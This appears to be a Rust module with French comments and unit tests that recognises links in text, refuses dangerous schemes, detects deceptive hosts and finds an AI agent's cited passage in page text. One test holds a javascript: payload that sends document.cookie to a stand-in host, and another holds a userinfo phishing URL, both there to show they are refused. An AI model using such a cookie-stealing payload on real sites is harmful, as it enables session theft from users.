//! Les liens du fil, et le passage qu'on voit avant la page.
//!
//! Tout ce qui est pur est ici et se prouve par des essais : reconnaitre un
//! lien dans un texte, dire ce qu'on en fait (ouvrir, signaler, refuser),
//! separer l'hote reel du chemin, retrouver dans le texte d'une page le
//! passage qu'un agent a cite, et l'etat que la feuille montre. Le dessin est
//! dans `feuille.rs`.
//!
//! Ce qui n'y est pas, et que la maquette remplace : le reseau. Au clic, la
//! vigie demanderait le texte de la page (un GET, ni cookie ni script) ; ici
//! `charger_pages` lit des extraits deja pris (`VIGIE_PAGES`), et `Reseau`
//! force les etats qu'un reseau sain ne montre pas.

use std::collections::HashMap;
use std::path::Path;

/// Un lien reconnu dans un texte : sa place en octets, et l'adresse.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct LienTexte {
    pub debut: usize,
    pub fin: usize,
    pub url: String,
    /// Pour un lien Markdown, le libelle entre crochets, sans eux : c'est lui
    /// qui se souligne, l'adresse entre parentheses restant du texte ordinaire.
    pub libelle: Option<(usize, usize)>,
}

fn est_fin_d_adresse(c: char) -> bool {
    c.is_whitespace() || matches!(c, '<' | '>' | '"' | '`' | '«' | '»' | '“' | '”' | '…')
}

/// Les signes qui terminent une phrase, pas une adresse.
fn nettoyer(mut u: &str) -> &str {
    loop {
        let Some(c) = u.chars().last() else { return u };
        let retire = match c {
            '.' | ',' | ';' | ':' | '!' | '?' | '\'' | '*' | '’' => true,
            ')' => u.matches(')').count() > u.matches('(').count(),
            ']' => u.matches(']').count() > u.matches('[').count(),
            '}' => u.matches('}').count() > u.matches('{').count(),
            _ => false,
        };
        if !retire {
            return u;
        }
        u = &u[..u.len() - c.len_utf8()];
    }
}

/// Les liens d'un texte, dans l'ordre. `http://`, `https://`, `ftp://`,
/// `file://`, et les schemas `javascript:` et `data:<type>/<soustype>` : on
/// reconnait aussi ce que la vigie refusera, pour que le refus se voie au lieu
/// d'un lien qui ne fait rien en silence. Un lien Markdown `[titre](adresse)`
/// est un seul lien, de son crochet a sa parenthese.
pub fn liens(texte: &str) -> Vec<LienTexte> {
    let mut sortie: Vec<LienTexte> = Vec::new();
    let mut i = 0;
    while i < texte.len() {
        let reste = &texte[i..];
        let Some(debut_rel) = trouver_debut(reste) else { break };
        let debut = i + debut_rel;
        let apres = &texte[debut..];
        let longueur = apres.find(est_fin_d_adresse).unwrap_or(apres.len());
        let brute = &apres[..longueur];
        let nette = nettoyer(brute);
        // Un schema sans rien derriere n'est pas une adresse.
        let a_un_corps = nette.split_once("://").map_or(true, |(_, r)| !r.is_empty());
        if nette.len() < 6 || !a_un_corps {
            i = debut + brute.len().max(1);
            continue;
        }
        let fin = debut + nette.len();
        let (mut d, mut f) = (debut, fin);
        let mut libelle = None;
        // [titre](adresse) : le lien va du crochet a la parenthese fermante.
        if texte[..debut].ends_with("](") && texte[fin..].starts_with(')') {
            let avant = &texte[..debut - 2];
            if let Some(crochet) = avant.rfind('[') {
                if !avant[crochet..].contains('\n') {
                    d = crochet;
                    f = fin + 1;
                    libelle = Some((crochet + 1, debut - 2));
                }
            }
        }
        sortie.push(LienTexte { debut: d, fin: f, url: nette.to_string(), libelle });
        i = f.max(debut + 1);
    }
    sortie
}

/// Le premier debut d'adresse dans `s` : un schema reconnu, precede d'une
/// frontiere (le debut, un blanc ou un signe), sauf `data:` qui exige son type.
fn trouver_debut(s: &str) -> Option<usize> {
    const SCHEMAS: [&str; 5] = ["https://", "http://", "ftp://", "file://", "javascript:"];
    let mut meilleur: Option<usize> = None;
    for sch in SCHEMAS {
        let mut depart = 0;
        while let Some(p) = s[depart..].find(sch) {
            let a = depart + p;
            let frontiere = s[..a].chars().last().map_or(true, |c| !c.is_alphanumeric());
            if frontiere && (sch != "javascript:" || s[a + sch.len()..].chars().next().is_some_and(|c| !c.is_whitespace() && !c.is_ascii_digit())) {
                meilleur = Some(meilleur.map_or(a, |m| m.min(a)));
                break;
            }
            depart = a + sch.len();
        }
    }
    // data:image/png;base64,… : le type est obligatoire, sans quoi « data: 5 »
    // d'un journal passerait pour un schema.
    let mut depart = 0;
    while let Some(p) = s[depart..].find("data:") {
        let a = depart + p;
        let frontiere = s[..a].chars().last().map_or(true, |c| !c.is_alphanumeric());
        let reste = &s[a + 5..];
        let type_ok = reste
            .split(|c: char| matches!(c, ';' | ',') || c.is_whitespace())
            .next()
            .is_some_and(|t| t.split_once('/').is_some_and(|(x, y)| !x.is_empty() && !y.is_empty() && x.chars().all(|c| c.is_ascii_alphabetic())));
        if frontiere && type_ok {
            meilleur = Some(meilleur.map_or(a, |m| m.min(a)));
            break;
        }
        depart = a + 5;
    }
    meilleur
}

/// Ce qu'on fait d'une adresse.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Classe {
    /// `https:` : s'ouvre.
    Web,
    /// `http:` : s'ouvre, signale « non chiffre ».
    NonChiffre,
    /// Cet ordinateur : demande avant.
    Local,
    /// Un modele d'adresse, pas une destination : pas cliquable.
    Gabarit,
    /// Un schema que la vigie n'ouvre jamais.
    Refuse(String),
}

pub fn classer(url: &str) -> Classe {
    let bas = url.to_ascii_lowercase();
    if let Some(sch) = ["javascript", "data", "file", "ftp", "blob"].iter().find(|s| bas.starts_with(&format!("{s}:"))) {
        return Classe::Refuse((*sch).to_string());
    }
    let (schema, reste) = match bas.split_once("://") {
        Some((s, r)) => (s.to_string(), r.to_string()),
        None => return Classe::Refuse(bas.split(':').next().unwrap_or("?").to_string()),
    };
    if schema != "http" && schema != "https" {
        return Classe::Refuse(schema);
    }
    if reste.contains(['{', '}', '$', '*', '<', '>', '|', '\\']) || reste.contains("example.com") || reste.contains("...") {
        return Classe::Gabarit;
    }
    let a = adresse(url);
    let nu = a.hote_nu();
    if nu == "localhost" || nu.ends_with(".localhost") || nu == "0.0.0.0" || nu.starts_with("127.") || nu == "[::1]" || nu.ends_with(".local") {
        return Classe::Local;
    }
    if schema == "http" { Classe::NonChiffre } else { Classe::Web }
}

/// Une adresse en trois morceaux, l'hote etant celui qui repond vraiment.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Adresse {
    pub schema: String,
    /// L'hote reel, avec son port s'il y en a un, jamais abrege.
    pub hote: String,
    /// Le chemin, la requete et l'ancre.
    pub chemin: String,
    /// L'ecriture qui peut tromper : un nom de domaine international, des
    /// signes hors ASCII, ou un `utilisateur@` devant l'hote. L'adresse se
    /// montre alors en forme brute.
    pub trompeuse: bool,
}

impl Adresse {
    /// L'hote sans son port.
    pub fn hote_nu(&self) -> &str {
        if self.hote.starts_with('[') {
            self.hote.find(']').map_or(self.hote.as_str(), |i| &self.hote[..=i])
        } else {
            self.hote.split(':').next().unwrap_or("")
        }
    }
}

pub fn adresse(url: &str) -> Adresse {
    // `javascript:`, `data:`, `mailto:` : un schema sans « // » n'a pas d'hote,
    // et ce qu'il porte (parfois une adresse https) n'en est pas un.
    if let Some((schema, reste)) = url.split_once(':') {
        if !reste.starts_with("//") && !schema.is_empty() && schema.chars().all(|c| c.is_ascii_alphabetic()) {
            return Adresse { schema: schema.to_ascii_lowercase(), hote: String::new(), chemin: reste.to_string(), trompeuse: false };
        }
    }
    let (schema, reste) = url.split_once("://").unwrap_or(("", url));
    let fin = reste.find(['/', '?', '#']).unwrap_or(reste.len());
    let (autorite, chemin) = reste.split_at(fin);
    let (info, hote) = autorite.rsplit_once('@').map_or(("", autorite), |(i, h)| (i, h));
    let hote = hote.to_ascii_lowercase();
    let sans_port = if hote.starts_with('[') { hote.as_str() } else { hote.split(':').next().unwrap_or("") };
    let trompeuse = !info.is_empty() || !sans_port.is_ascii() || sans_port.split('.').any(|e| e.starts_with("xn--"));
    Adresse {
        schema: schema.to_ascii_lowercase(),
        hote,
        chemin: if chemin.is_empty() { "/".to_string() } else { chemin.to_string() },
        trompeuse,
    }
}

/// La forme sur laquelle deux ecritures d'un meme texte s'accordent : minuscules,
/// guillemets et tirets uniformes, emphase retiree, blancs reduits.
fn plier(c: char, sortie: &mut String) {
    match c {
        '*' | '_' | '`' => {}
        '\u{2019}' | '\u{2018}' => sortie.push('\''),
        '\u{201c}' | '\u{201d}' | '\u{00ab}' | '\u{00bb}' => sortie.push('"'),
        '\u{2014}' | '\u{2013}' => sortie.push('-'),
        c => sortie.extend(c.to_lowercase()),
    }
}

/// Le texte plie, et pour chacun de ses octets l'octet d'origine.
fn plat_avec_carte(texte: &str) -> (String, Vec<usize>) {
    let mut plat = String::with_capacity(texte.len());
    let mut carte: Vec<usize> = Vec::with_capacity(texte.len());
    let mut espace = true;
    for (i, c) in texte.char_indices() {
        if c.is_whitespace() || c == '\u{00a0}' {
            if !espace {
                plat.push(' ');
                carte.push(i);
                espace = true;
            }
            continue;
        }
        let avant = plat.len();
        plier(c, &mut plat);
        for _ in avant..plat.len() {
            carte.push(i);
        }
        if plat.len() > avant {
            espace = false;
        }
    }
    (plat, carte)
}

fn plier_texte(s: &str) -> String {
    plat_avec_carte(s).0.trim().to_string()
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Trouve {
    /// La citation entiere est dans la page.
    Complet,
    /// Seuls ses huit premiers mots y sont : de quoi surligner par fragment,
    /// pas de quoi dire que le reste y est.
    Debut,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Extrait {
    pub avant: String,
    pub passage: String,
    pub apres: String,
    pub trouve: Trouve,
    /// Le contexte a ete coupe de ce cote : la phrase continue au-dela.
    pub coupe_avant: bool,
    pub coupe_apres: bool,
}

const CONTEXTE: usize = 230;
const PASSAGE_MAX: usize = 420;

/// Coupe `s` a au plus `n` caracteres en gardant la fin (ou le debut), sur une
/// frontiere de mot.
fn garder_fin(s: &str, n: usize) -> (String, bool) {
    let c: Vec<char> = s.chars().collect();
    if c.len() <= n {
        return (s.trim().to_string(), false);
    }
    let mut d = c.len() - n;
    while d < c.len() && !c[d].is_whitespace() {
        d += 1;
    }
    (c[d..].iter().collect::<String>().trim().to_string(), true)
}

fn garder_debut(s: &str, n: usize) -> (String, bool) {
    let c: Vec<char> = s.chars().collect();
    if c.len() <= n {
        return (s.trim().to_string(), false);
    }
    let mut f = n;
    while f > 0 && !c[f].is_whitespace() {
        f -= 1;
    }
    (c[..f].iter().collect::<String>().trim().to_string(), true)
}

pub fn une_ligne_de(s: &str) -> String {
    // Les signes invisibles d'une page (cesure conditionnelle, espaces de
    // largeur nulle, marques de sens d'ecriture) n'ont pas de glyphe dans la
    // police : ils s'afficheraient en carre vide.
    let propre: String = s
        .chars()
        .filter(|c| !matches!(c, '\u{00ad}' | '\u{200b}'..='\u{200f}' | '\u{2060}' | '\u{feff}' | '\u{202a}'..='\u{202e}') && (!c.is_control() || c.is_whitespace()))
        .collect();
    propre.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Le passage cite, retrouve dans le texte d'une page, avec ce qui l'entoure.
/// `None` si la page ne le contient pas, meme par ses huit premiers mots.
pub fn extraire(page: &str, citation: &str) -> Option<Extrait> {
    let (plat, carte) = plat_avec_carte(page);
    let q = plier_texte(citation).trim_matches('"').trim().to_string();
    if q.is_empty() {
        return None;
    }
    let huit = q.split(' ').take(8).collect::<Vec<_>>().join(" ");
    let (j, genre, longueur) = if let Some(j) = plat.find(&q) {
        (j, Trouve::Complet, q.len())
    } else if q.split(' ').count() >= 8 {
        (plat.find(&huit)?, Trouve::Debut, q.len())
    } else {
        return None;
    };
    let fin_plat = (j + longueur).min(plat.len());
    let d = carte[j];
    let f = if fin_plat >= carte.len() {
        page.len()
    } else {
        // L'octet d'origine du dernier octet plie, puis la fin de son caractere.
        let dernier = carte[fin_plat - 1];
        dernier + page[dernier..].chars().next().map_or(0, char::len_utf8)
    };
    let (passage, _) = garder_debut(&une_ligne_de(&page[d..f]), PASSAGE_MAX);
    let (avant, coupe_avant) = garder_fin(&une_ligne_de(&page[..d]), CONTEXTE);
    let (apres, coupe_apres) = garder_debut(&une_ligne_de(&page[f..]), CONTEXTE);
    Some(Extrait { avant, passage, apres, trouve: genre, coupe_avant, coupe_apres })
}

/// Une page, telle que la maquette la lit.
#[derive(Clone, Debug, serde::Deserialize)]
pub struct Page {
    pub url: String,
    #[serde(default)]
    pub invite: String,
    #[serde(default)]
    pub citation: Option<String>,
    #[serde(default)]
    pub titre: String,
    #[serde(default)]
    pub texte: String,
    #[serde(default)]
    pub releve: String,
}

pub fn charger_pages(dossier: &Path) -> HashMap<String, Page> {
    let mut sortie = HashMap::new();
    let Ok(lecture) = std::fs::read_dir(dossier) else { return sortie };
    for e in lecture.flatten() {
        if e.path().extension().is_some_and(|x| x == "json") {
            if let Some(p) = std::fs::read_to_string(e.path()).ok().and_then(|t| serde_json::from_str::<Page>(&t).ok()) {
                sortie.insert(p.url.clone(), p);
            }
        }
    }
    sortie
}

/// Ce que le reseau repondrait, force pour qu'une capture montre l'etat.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Reseau {
    Lent,
    Absente,
    Certificat,
    Delai,
    HorsLigne,
    Connexion,
    Fichier,
    Redirection,
    Introuvable,
}

impl Reseau {
    pub fn nomme(n: &str) -> Option<Reseau> {
        Some(match n.trim() {
            "lent" => Reseau::Lent,
            "404" => Reseau::Absente,
            "certificat" => Reseau::Certificat,
            "delai" => Reseau::Delai,
            "hors-ligne" => Reseau::HorsLigne,
            "connexion" => Reseau::Connexion,
            "fichier" => Reseau::Fichier,
            "redirection" => Reseau::Redirection,
            "introuvable" => Reseau::Introuvable,
            _ => return None,
        })
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Echec {
    Absente,
    Certificat,
    Delai,
    /// Le serveur a repondu autre chose qu'une page : son code.
    Serveur(u16),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Etat {
    Chargement,
    /// La citation est dans la page.
    Passage(Extrait),
    /// L'agent a cite un texte que la page d'aujourd'hui ne contient pas.
    Introuvable { citation: String, debut_page: String },
    /// L'agent n'a rien cite : la page s'ouvre en haut.
    SansPassage { debut_page: String },
    Echec(Echec),
    HorsLigne,
    Connexion,
    Fichier,
    /// Le serveur a envoye ailleurs : l'hote d'arrivee, et ce qu'on y a lu.
    Redirection { vers: String, contenu: Box<Etat> },
    /// Un schema que la vigie n'ouvre pas.
    Refuse(String),
    /// Cet ordinateur : on demande avant.
    Local,
    /// L'adresse n'est pas dans les pages que la maquette a en main.
    HorsMaquette,
}

fn tete_de_page(p: &Page) -> String {
    une_ligne_de(&p.texte).chars().take(260).collect::<String>().trim().to_string()
}

/// Ce que la feuille dit d'une page lue : le passage, son absence, ou l'absence
/// de citation. `sans_texte` force « introuvable » (le temoin des captures).
pub fn etat_de_page(p: &Page, sans_texte: bool) -> Etat {
    let texte = if sans_texte { "" } else { p.texte.as_str() };
    match p.citation.as_deref() {
        None => Etat::SansPassage { debut_page: tete_de_page(p) },
        Some(c) => match extraire(texte, c) {
            Some(x) => Etat::Passage(x),
            None => Etat::Introuvable { citation: une_ligne_de(c), debut_page: tete_de_page(p) },
        },
    }
}

/// Parmi les citations de l'agent, celle que la page contient : la premiere
/// qu'elle a en entier, sinon la premiere dont elle a le debut, sinon la
/// premiere tout court (pour dire qu'elle est introuvable). `None` quand
/// l'agent n'a rien cite.
pub fn choisir_citation(texte: &str, candidates: &[String]) -> Option<String> {
    let trouvee = |genre: Trouve| candidates.iter().find(|c| extraire(texte, c).is_some_and(|x| x.trouve == genre));
    trouvee(Trouve::Complet).or_else(|| trouvee(Trouve::Debut)).or_else(|| candidates.first()).cloned()
}

/// Ce que la lecture du reseau devient pour la feuille : l'etat, et la page
/// quand il y en a une. `lecture` est ce que la transcription sait du geste.
pub fn etat_de_l_issue(url: &str, issue: &crate::reseau::Issue, lecture: Option<&crate::suivi::Lecture>, releve: &str) -> (Etat, Option<Page>) {
    use crate::reseau::Issue;
    let simple = |e: Etat| (e, None);
    match issue {
        Issue::Page(lu) => {
            let candidates = lecture.map(|l| l.citations.as_slice()).unwrap_or(&[]);
            let page = Page {
                url: url.to_string(),
                invite: lecture.map(|l| l.invite.clone()).unwrap_or_default(),
                citation: choisir_citation(&lu.texte, candidates),
                titre: lu.titre.clone(),
                texte: lu.texte.clone(),
                releve: releve.to_string(),
            };
            let contenu = etat_de_page(&page, false);
            match &lu.redirection {
                Some(vers) => (Etat::Redirection { vers: vers.clone(), contenu: Box::new(contenu) }, Some(page)),
                None => (contenu, Some(page)),
            }
        }
        Issue::Fichier => simple(Etat::Fichier),
        Issue::Connexion => simple(Etat::Connexion),
        Issue::Absente => simple(Etat::Echec(Echec::Absente)),
        Issue::Statut(c) => simple(Etat::Echec(Echec::Serveur(*c))),
        Issue::Certificat => simple(Etat::Echec(Echec::Certificat)),
        Issue::Delai => simple(Etat::Echec(Echec::Delai)),
        Issue::HorsLigne => simple(Etat::HorsLigne),
        Issue::Refuse(s) => simple(Etat::Refuse(s.clone())),
        Issue::Local => simple(Etat::Local),
    }
}

/// L'etat sous une redirection : ce qu'on a lu, sans l'avis qui la precede.
pub fn etat_de_fond(e: &Etat) -> &Etat {
    match e {
        Etat::Redirection { contenu, .. } => etat_de_fond(contenu),
        autre => autre,
    }
}

/// L'adresse a donner au moteur de page, et le texte que le script cherchera
/// si le fragment n'a pas suffi. Un passage retrouve par son debut seulement
/// ne se dit que par ses huit premiers mots ; un passage introuvable dans le
/// texte lu sans script se tente tout de meme avec la citation de l'agent,
/// puisque la page vivante peut le contenir ; sans citation, la page s'ouvre
/// en haut.
pub fn adresse_a_ouvrir(url: &str, etat: &Etat) -> (String, Option<String>) {
    let texte = match etat_de_fond(etat) {
        Etat::Passage(x) if x.trouve == Trouve::Complet => Some(x.passage.clone()),
        Etat::Passage(x) => Some(x.passage.split(' ').take(8).collect::<Vec<_>>().join(" ")),
        Etat::Introuvable { citation, .. } => Some(citation.clone()),
        _ => None,
    };
    (adresse_du_passage(url, texte.as_deref()), texte.map(|t| t.chars().take(300).collect()))
}

/// Les octets d'un morceau de fragment : tout sauf les signes non reserves,
/// dont le tiret, la virgule et l'esperluette, qui ont un sens dans un fragment
/// de texte.
fn coder_fragment(s: &str) -> String {
    let mut r = String::with_capacity(s.len() * 2);
    for o in s.bytes() {
        if o.is_ascii_alphanumeric() || matches!(o, b'_' | b'.' | b'~') {
            r.push(o as char);
        } else {
            r.push_str(&format!("%{o:02X}"));
        }
    }
    r
}

/// L'adresse a ouvrir pour que le moteur surligne le passage : un fragment de
/// texte `#:~:text=debut,fin`. Un passage long se dit par son debut et sa fin,
/// qui peuvent tomber dans des blocs differents. Sans passage, l'adresse telle
/// quelle : la page s'ouvre en haut.
pub fn adresse_du_passage(url: &str, passage: Option<&str>) -> String {
    let Some(p) = passage.map(une_ligne_de).filter(|p| !p.is_empty()) else { return url.to_string() };
    let mots: Vec<&str> = p.split(' ').collect();
    let directive = if mots.len() > 12 {
        format!("{},{}", coder_fragment(&mots[..6].join(" ")), coder_fragment(&mots[mots.len() - 4..].join(" ")))
    } else {
        coder_fragment(&p)
    };
    // Une ancre existante reste ; la directive s'y ajoute apres « :~: ».
    let (base, ancre) = url.split_once('#').unwrap_or((url, ""));
    let ancre = ancre.split(":~:").next().unwrap_or("");
    format!("{base}#{ancre}:~:text={directive}")
}

/// L'etat que montre la feuille pour un lien cliqué. Pur : le reseau est
/// remplace par `pages` et par `force`.
pub fn resoudre(url: &str, pages: &HashMap<String, Page>, force: Option<Reseau>, local_confirme: bool) -> Etat {
    match classer(url) {
        Classe::Refuse(s) => return Etat::Refuse(s),
        Classe::Gabarit => return Etat::Refuse("gabarit".to_string()),
        Classe::Local if !local_confirme => return Etat::Local,
        _ => {}
    }
    match force {
        Some(Reseau::Lent) => return Etat::Chargement,
        Some(Reseau::Absente) => return Etat::Echec(Echec::Absente),
        Some(Reseau::Certificat) => return Etat::Echec(Echec::Certificat),
        Some(Reseau::Delai) => return Etat::Echec(Echec::Delai),
        Some(Reseau::HorsLigne) => return Etat::HorsLigne,
        Some(Reseau::Connexion) => return Etat::Connexion,
        Some(Reseau::Fichier) => return Etat::Fichier,
        _ => {}
    }
    let contenu = match pages.get(url) {
        None => Etat::HorsMaquette,
        Some(p) => etat_de_page(p, force == Some(Reseau::Introuvable)),
    };
    if force == Some(Reseau::Redirection) {
        let a = adresse(url);
        let vers = a.hote.strip_prefix("www.").map_or_else(|| format!("www.{}", a.hote), str::to_string);
        return Etat::Redirection { vers, contenu: Box::new(contenu) };
    }
    contenu
}

/// Le mot qui dit, avant le clic, si un passage est connu : la maquette le
/// sait par la citation de l'agent, que la transcription porte.
pub fn passage_connu(url: &str, pages: &HashMap<String, Page>) -> bool {
    pages.get(url).is_some_and(|p| p.citation.is_some())
}

#[cfg(test)]
mod essais {
    use super::*;

    fn urls(t: &str) -> Vec<String> {
        liens(t).into_iter().map(|l| l.url).collect()
    }

    #[test]
    fn un_lien_perd_la_ponctuation_de_la_phrase() {
        assert_eq!(urls("voir https://a.org/x. Puis"), ["https://a.org/x"]);
        assert_eq!(urls("(https://a.org/x_(y))"), ["https://a.org/x_(y)"]);
        assert_eq!(urls("(https://a.org/x)"), ["https://a.org/x"]);
        assert_eq!(urls("http://a.org, https://b.org;"), ["http://a.org", "https://b.org"]);
    }

    #[test]
    fn un_lien_markdown_est_un_seul_lien_du_crochet_a_la_parenthese() {
        let t = "Sources: [Glottopedia — Maxim](http://www.g.org/i.php/Maxim) et la suite";
        let l = liens(t);
        assert_eq!(l.len(), 1);
        assert_eq!(&t[l[0].debut..l[0].fin], "[Glottopedia — Maxim](http://www.g.org/i.php/Maxim)");
        assert_eq!(l[0].url, "http://www.g.org/i.php/Maxim");
        let (a, b) = l[0].libelle.unwrap();
        assert_eq!(&t[a..b], "Glottopedia — Maxim");
        assert_eq!(liens("http://a.org/x")[0].libelle, None);
    }

    #[test]
    fn les_schemas_refuses_se_reconnaissent_sans_prendre_le_texte_ordinaire() {
        assert_eq!(urls("ouvre file:///C:/x.txt"), ["file:///C:/x.txt"]);
        assert_eq!(urls("a javascript:alert(1) b"), ["javascript:alert(1)"]);
        assert_eq!(urls("src=data:image/png;base64,AAAA fin"), ["data:image/png;base64,AAAA"]);
        assert!(urls("data: 5 lignes et javascript: 12").is_empty());
        assert!(urls("la clé https:// seule").is_empty());
    }

    #[test]
    fn les_classes() {
        assert_eq!(classer("https://arxiv.org/abs/1"), Classe::Web);
        assert_eq!(classer("http://arxiv.org/abs/1"), Classe::NonChiffre);
        assert_eq!(classer("http://localhost:3000/x"), Classe::Local);
        assert_eq!(classer("http://127.0.0.1:8080"), Classe::Local);
        assert_eq!(classer("https://api.example.com/v1"), Classe::Gabarit);
        assert_eq!(classer("https://x.dev/{id}"), Classe::Gabarit);
        assert_eq!(classer("file:///C:/a"), Classe::Refuse("file".into()));
        assert_eq!(classer("JavaScript:alert(1)"), Classe::Refuse("javascript".into()));
        assert_eq!(classer("ftp://x.org/a"), Classe::Refuse("ftp".into()));
    }

    #[test]
    fn l_hote_est_celui_qui_repond() {
        let a = adresse("https://docs.expo.dev/versions/latest/sdk/gl-view/#x");
        assert_eq!((a.hote.as_str(), a.chemin.as_str(), a.trompeuse), ("docs.expo.dev", "/versions/latest/sdk/gl-view/#x", false));
        // Le piege classique : ce qui precede l'arobase n'est pas l'hote.
        let b = adresse("https://apple.com@evil.example/login");
        assert_eq!(b.hote, "evil.example");
        assert!(b.trompeuse);
        assert!(adresse("https://xn--pple-43d.com/").trompeuse);
        assert!(adresse("https://аpple.com/").trompeuse);
        assert_eq!(adresse("http://localhost:3000").hote, "localhost:3000");
        // Un schema sans hote : ce qu'il porte n'est pas l'hote d'une adresse.
        let j = adresse("javascript:fetch('https://collecte.example/'+document.cookie)");
        assert_eq!((j.schema.as_str(), j.hote.as_str()), ("javascript", ""));
        assert_eq!(adresse("file:///C:/x.txt").schema, "file");
    }

    const PAGE: &str = "Menu  Accueil\n\nLe seuil de Unity Personal est de 200 000 $ de revenus\npar année. Le   deuxième paragraphe parle d'autre chose et d'un tiers. Fin de la page.";

    #[test]
    fn le_passage_se_retrouve_malgre_les_blancs_les_majuscules_et_les_guillemets() {
        let x = extraire(PAGE, "« le SEUIL de unity personal est de 200 000 $ de revenus par année »").unwrap();
        assert_eq!(x.trouve, Trouve::Complet);
        assert_eq!(x.passage, "Le seuil de Unity Personal est de 200 000 $ de revenus par année");
        assert!(x.avant.contains("Menu"));
        assert!(x.apres.starts_with(". Le deuxième") || x.apres.starts_with("."), "{:?}", x.apres);
    }

    #[test]
    fn le_debut_seul_suffit_a_dire_debut() {
        let c = "Le seuil de Unity Personal est de 200 000 $ de revenus puis une phrase que la page ne dit pas";
        let x = extraire(PAGE, c).unwrap();
        assert_eq!(x.trouve, Trouve::Debut);
        assert!(x.passage.starts_with("Le seuil de Unity Personal"));
    }

    #[test]
    fn une_citation_courte_absente_n_est_pas_devinee() {
        assert!(extraire(PAGE, "Le seuil est de 30").is_none());
        assert!(extraire(PAGE, "").is_none());
        assert!(extraire("", "n'importe quoi de plus de huit mots comme ceci et cela").is_none());
    }

    #[test]
    fn l_extrait_coupe_son_contexte_sur_un_mot_et_le_dit() {
        let long = format!("{} CIBLE DE LA CITATION ICI {}", "mot ".repeat(200), "suite ".repeat(200));
        let x = extraire(&long, "cible de la citation ici").unwrap();
        assert!(x.coupe_avant && x.coupe_apres);
        assert!(x.avant.chars().count() <= CONTEXTE && x.apres.chars().count() <= CONTEXTE);
        assert!(!x.avant.starts_with("ot") && x.avant.starts_with("mot"));
    }

    #[test]
    fn les_octets_d_origine_survivent_aux_accents() {
        // La citation finit par un caractere accentue de deux octets : couper un
        // octet trop court laisserait un caractere en morceaux.
        let page = "Élève à l'école : « Voilà le passage cité, très précis, tout à fait exactement cité » puis la suite.";
        let x = extraire(page, "voilà le passage cité, très précis, tout à fait exactement cité").unwrap();
        assert_eq!(x.passage, "Voilà le passage cité, très précis, tout à fait exactement cité");
        assert!(x.avant.starts_with("Élève"));
    }

    fn pages() -> HashMap<String, Page> {
        let mut m = HashMap::new();
        let p = |u: &str, c: Option<&str>| Page { url: u.into(), invite: "?".into(), citation: c.map(Into::into), titre: "T".into(), texte: PAGE.into(), releve: String::new() };
        m.insert("https://a.org/ok".into(), p("https://a.org/ok", Some("Le seuil de Unity Personal est de 200 000 $ de revenus par année")));
        m.insert("https://a.org/aucune".into(), p("https://a.org/aucune", None));
        m.insert("https://a.org/absente".into(), p("https://a.org/absente", Some("une phrase que la page ne contient absolument pas du tout")));
        m
    }

    #[test]
    fn resoudre_distingue_les_trois_cas_et_les_refus() {
        let p = pages();
        assert!(matches!(resoudre("https://a.org/ok", &p, None, false), Etat::Passage(_)));
        assert!(matches!(resoudre("https://a.org/aucune", &p, None, false), Etat::SansPassage { .. }));
        assert!(matches!(resoudre("https://a.org/absente", &p, None, false), Etat::Introuvable { .. }));
        assert!(matches!(resoudre("https://a.org/inconnue", &p, None, false), Etat::HorsMaquette));
        assert_eq!(resoudre("file:///C:/x", &p, None, false), Etat::Refuse("file".into()));
        assert_eq!(resoudre("http://localhost:3000", &p, None, false), Etat::Local);
        assert!(matches!(resoudre("http://localhost:3000", &p, None, true), Etat::HorsMaquette));
        assert_eq!(resoudre("https://a.org/ok", &p, Some(Reseau::Lent), false), Etat::Chargement);
        assert!(matches!(resoudre("https://a.org/ok", &p, Some(Reseau::Introuvable), false), Etat::Introuvable { .. }));
        // Un schema refuse l'emporte sur tout reseau force : rien n'est tente.
        assert_eq!(resoudre("javascript:alert(1)", &p, Some(Reseau::Lent), false), Etat::Refuse("javascript".into()));
        match resoudre("https://a.org/ok", &p, Some(Reseau::Redirection), false) {
            Etat::Redirection { vers, contenu } => {
                assert_eq!(vers, "www.a.org");
                assert!(matches!(*contenu, Etat::Passage(_)));
            }
            x => panic!("{x:?}"),
        }
    }

    #[test]
    fn les_signes_invisibles_d_une_page_ne_passent_pas_a_l_affichage() {
        assert_eq!(une_ligne_de("TRUNCATE\u{200b}_STRINGS\u{00ad} 8\u{200e}\n  suite\u{0007}"), "TRUNCATE_STRINGS 8 suite");
    }

    #[test]
    fn le_passage_est_connu_avant_le_clic_par_la_citation_seule() {
        let p = pages();
        assert!(passage_connu("https://a.org/ok", &p));
        assert!(passage_connu("https://a.org/absente", &p));
        assert!(!passage_connu("https://a.org/aucune", &p));
        assert!(!passage_connu("https://a.org/inconnue", &p));
    }

    #[test]
    fn la_citation_choisie_est_celle_que_la_page_contient() {
        let page = "Intro. Le seuil de Unity Personal est de 200 000 $ de revenus par année. Fin de la page, rien d'autre ici.";
        let c = vec![
            "Une phrase que la page ne dit pas du tout, vraiment pas".to_string(),
            "Le seuil de Unity Personal est de 200 000 $ de revenus par année".to_string(),
            "Le seuil de Unity Personal est de 200 000 $ de revenus, puis une suite inventée".to_string(),
        ];
        assert_eq!(choisir_citation(page, &c).as_deref(), Some(c[1].as_str()));
        // Aucune en entier : celle dont le debut y est passe avant la premiere tout court.
        assert_eq!(choisir_citation(page, &[c[0].clone(), c[2].clone()]).as_deref(), Some(c[2].as_str()));
        // Aucune nulle part : la premiere, pour dire qu'elle est introuvable.
        assert_eq!(choisir_citation(page, &[c[0].clone()]).as_deref(), Some(c[0].as_str()));
        assert_eq!(choisir_citation(page, &[]), None);
    }

    #[test]
    fn le_fragment_de_texte_code_ce_qui_a_un_sens_dans_un_fragment() {
        assert_eq!(adresse_du_passage("https://a.org/x", Some("Vec is a-b, c & d")), "https://a.org/x#:~:text=Vec%20is%20a%2Db%2C%20c%20%26%20d");
        assert_eq!(adresse_du_passage("https://a.org/x", None), "https://a.org/x");
        assert_eq!(adresse_du_passage("https://a.org/x", Some("   ")), "https://a.org/x");
        // Une ancre existante est gardee ; une directive existante est remplacee.
        assert_eq!(adresse_du_passage("https://a.org/x#sec", Some("mot")), "https://a.org/x#sec:~:text=mot");
